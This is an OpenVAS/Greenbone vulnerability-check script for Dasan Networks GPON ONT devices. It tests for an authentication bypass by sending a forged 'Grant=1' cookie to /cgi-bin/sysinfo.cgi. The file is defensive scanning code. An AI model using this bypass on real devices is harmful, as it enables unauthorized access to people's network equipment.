CPE = "cpe:/a:dansan_networks:gpon_ont";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106952" );
	script_version( "$Revision: 11916 $" );
	script_tag( name: "last_modification", value: "$Date: 2018-10-16 10:36:43 +0200 (Tue, 16 Oct 2018) $" );
	script_tag( name: "creation_date", value: "2017-07-14 11:20:16 +0700 (Fri, 14 Jul 2017)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "Dasan Networks GPON ONT Devices Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "This script is Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_dasan_gpon_ont_detect.sc" );
	script_mandatory_keys( "dasan_gpon_ont/detected" );
	script_tag( name: "summary", value: "Dasan Networks GPON ONT devices are prone to multiple vulnerabilities:

  - Authentication Bypass.

  - Cross-Site Request Forgery.

  - Privilege Escalation

  - System Config Download and Upload." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5421.php" );
	script_xref( name: "URL", value: "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5422.php" );
	script_xref( name: "URL", value: "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5423.php" );
	script_xref( name: "URL", value: "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5424.php" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
url = "/cgi-bin/sysinfo.cgi";
cookie = "Grant=1; Language=english; silverheader=3c";
if(http_vuln_check( port: port, url: url, pattern: "System Information", check_header: TRUE, extra_check: "lbl_version", cookie: cookie )){
	report = "It was possible to bypass authentication and access '/cgi-bin/sysinfo.cgi'.";
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

